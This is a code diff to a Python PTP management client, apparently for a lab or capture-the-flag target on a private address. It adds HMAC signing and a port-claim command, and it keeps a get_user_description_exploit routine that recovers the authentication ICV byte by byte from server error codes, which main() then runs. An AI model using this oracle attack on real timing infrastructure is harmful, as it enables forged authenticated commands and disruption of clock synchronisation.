@@ -5,6 +5,8 @@ import socket
 import ptp_protocol
 import ptp_message
 import uuid
+import hmac
+import hashlib
 
 class PtpManagement:
     SERVER_ADDRESS = "172.21.0.2"
@@ -33,11 +35,13 @@ class PtpManagement:
     def __exit__(self, exc_type, exc_value, traceback):
         self.socket.close()
 
+    def send_raw(self, request, event=False):
+        port = self.SERVER_PORT_EVENT if event else self.SERVER_PORT_GENERAL
+        self.socket.sendto(request, (self.SERVER_ADDRESS, port))
+
     def send(self, message, event=False):
         request = message.encode(self.BUFFER_SIZE)
-        port = self.SERVER_PORT_EVENT if event else self.SERVER_PORT_GENERAL
-
-        self.socket.sendto(request, (self.SERVER_ADDRESS, port))
+        self.send_raw(request, event)
 
     def receive(self):
         response, server = self.socket.recvfrom(self.BUFFER_SIZE)
@@ -63,7 +67,36 @@ class PtpManagement:
         tlv.payload.authentication.key_id = 0
         tlv.payload.authentication.icv_length = 16
 
-    def get_user_description(self):
+    def claim_port(self, secret, description):
+        secret = secret.encode('utf-8')
+        if (len(secret) > 100):
+            raise ValueError("Secret too large")
+
+        description = description.encode('utf-8')
+        if (len(description) > 128):
+            raise ValueError("User description too large")
+        
+        message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, self.clock_id, self.port, self.sequence_number)
+        self.sequence_number += 1
+
+        payload = message.get_payload()
+        payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
+        payload.management.target_port_id.port = self.target_port
+        payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_COMMAND
+        payload.management.starting_boundary_hops = 0
+        payload.management.boundary_hops = 0
+
+        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
+        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_IMPLEMENTATION_SPECIFIC_PORT_CLAIM
+        ptp_protocol.ffi.memmove(tlv.payload.management.payload.port_claim.port_secret, secret + b'\0', len(secret) + 1)
+        ptp_protocol.ffi.memmove(tlv.payload.management.payload.port_claim.user_description, description + b'\0', len(description) + 1)
+        
+        self.send(message)
+        response = self.receive()
+
+    def get_user_description(self, secret):
+        secret = secret.encode('utf-8') + b'\x00' * (100 - len(secret))
+
         message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, self.clock_id, self.port, self.sequence_number)
         self.sequence_number += 1
 
@@ -78,32 +111,12 @@ class PtpManagement:
         tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION
 
         self.add_auth_tlv(message)
-        
-        self.send(message)
-        response = self.receive()
 
-    def set_user_description(self, description):
-        description = description.encode('utf-8')
-        if (len(description) > 128):
-            raise ValueError("User description too large")
+        request = bytearray(message.encode(self.BUFFER_SIZE))
+        icv = hmac.new(secret, request[:-16], hashlib.sha256).digest()
+        request[-16:] = icv[:16]
+        self.send_raw(request)
 
-        message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, self.clock_id, self.port, self.sequence_number)
-        self.sequence_number += 1
-
-        payload = message.get_payload()
-        payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
-        payload.management.target_port_id.port = self.target_port
-        payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_SET
-        payload.management.starting_boundary_hops = 0
-        payload.management.boundary_hops = 0
-
-        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
-        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION
-        ptp_protocol.ffi.memmove(tlv.payload.management.payload.user_description, description + b'\0', len(description) + 1)
-
-        self.add_auth_tlv(message)
-        
-        self.send(message)
         response = self.receive()
 
     def get_user_description_exploit(self):
@@ -128,7 +141,7 @@ class PtpManagement:
         for i in range(len(icv) + 1):
             request[-len(icv):] = icv
 
-            self.socket.sendto(request, (self.SERVER_ADDRESS, self.SERVER_PORT_GENERAL))
+            self.send_raw(request)
             response = self.receive()
 
             if (response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT):
@@ -139,9 +152,16 @@ class PtpManagement:
                     icv[i] = tlv.payload.management_error_status.error_id - 0xc000
 
 def main():
-    with PtpManagement(42, 1) as management:
-        #management.set_user_description("test1234")
-        #management.get_user_description()
+    with PtpManagement(42, 1337) as management:
+        print("Claim port")
+        management.claim_port("password", "my port")
+        print()
+
+        print("Get user description")
+        management.get_user_description("password")
+        print()
+
+        print("Exploit")
         management.get_user_description_exploit()
 
 if __name__ == "__main__":
